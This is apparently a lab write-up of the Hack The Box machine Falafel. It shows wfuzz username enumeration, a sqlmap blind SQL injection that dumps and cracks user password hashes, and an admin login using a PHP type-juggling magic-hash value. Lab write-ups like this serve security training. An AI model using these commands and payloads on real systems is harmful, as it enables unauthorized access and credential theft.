# Web Server on 80

![[Pasted image 20211125192701.png]]

```bash
$ wfuzz -c -z file,names.txt --hw 657 -d "username=FUZZ&password=Hacking" http://10.10.10.73/login.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.73/login.php
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000086:   200        102 L    659 W      7091 Ch     "admin"                                                                                                                      
000001886:   200        102 L    659 W      7091 Ch     "chris"                                                                                                                      

Total time: 0
Processed Requests: 10177
Filtered Requests: 10175
Requests/sec.: 0

```

Users ; 
admin
chris

![[Pasted image 20211125192901.png]]


## SQLMAP on [Login page](http://10.10.10.73/login.php)

```bash
$ sqlmap -r login.req --level 5 --risk 3 --batch --string "Wrong identification" --dbms mysql -p username,password 


... [snip] ...

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 520 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=chris' AND 9387=9387-- ROVy&password=passwofdd
---
[06:52:02] [INFO] testing MySQL
[06:52:02] [INFO] confirming MySQL
[06:52:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.
```
* Content of log.req
```bash
$ cat login.req 
POST /login.php HTTP/1.1
Host: 10.10.10.73
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.10.10.73
DNT: 1
Connection: close
Referer: http://10.10.10.73/login.php
Cookie: PHPSESSID=sq1fdhuas5g5osv53m0t1hm6d1
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=chris&password=passwofdd

```


SQLMap --Dump
``` bash
$ sqlmap -r login.req --level 5 --risk 3 --batch --string "Wrong identification" --dbms mysql -p username,password --dump


... [snip] ...

[06:52:37] [INFO] fetching current database                                                                                                                                           [11/957]
[06:52:37] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:52:37] [INFO] retrieved: falafel                                                           
[06:52:48] [INFO] fetching tables for database: 'falafel'
[06:52:48] [INFO] fetching number of tables for database 'falafel'
[06:52:48] [INFO] retrieved: 1
[06:52:49] [INFO] retrieved: users
[06:52:56] [INFO] fetching columns for table 'users' in database 'falafel'
[06:52:56] [INFO] retrieved: 4
[06:52:57] [INFO] retrieved: ID
[06:53:01] [INFO] retrieved: username
[06:53:12] [INFO] retrieved: password
[06:53:22] [INFO] retrieved: role
[06:53:28] [INFO] fetching entries for table 'users' in database 'falafel'
[06:53:28] [INFO] fetching number of entries for table 'users' in database 'falafel'
[06:53:28] [INFO] retrieved: 2
[06:53:29] [INFO] retrieved: 1
[06:53:31] [INFO] retrieved: 0e462096931906507119562988736854
[06:54:20] [INFO] retrieved: admin
[06:54:27] [INFO] retrieved: admin
[06:54:34] [INFO] retrieved: 2
[06:54:35] [INFO] retrieved: d4ee02a22fc872e36d9e3751ba72ddc8
[06:55:24] [INFO] retrieved: normal
[06:55:32] [INFO] retrieved: chris
[06:55:39] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[06:55:39] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[06:55:39] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[06:55:39] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[06:55:39] [INFO] starting 4 processes 
[06:55:41] [INFO] cracked password 'juggling' for user 'chris'                                                                                                                                
                                                                                               Database: falafel                                                                             
Table: users                                   
[2 entries]                                    
+----+--------+---------------------------------------------+----------+
| ID | role   | password                                    | username |
+----+--------+---------------------------------------------+----------+
| 1  | admin  | 0e462096931906507119562988736854            | admin    |
| 2  | normal | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) | chris    |
+----+--------+---------------------------------------------+----------+

```


* Logon as chris 
http://10.10.10.73/profile.php
![[Pasted image 20211126070524.png]]

### Php type juggling
https://news.ycombinator.com/item?id=9484757

using 
```
240610708
```
for auth as admin 
![[Pasted image 20211126072059.png]]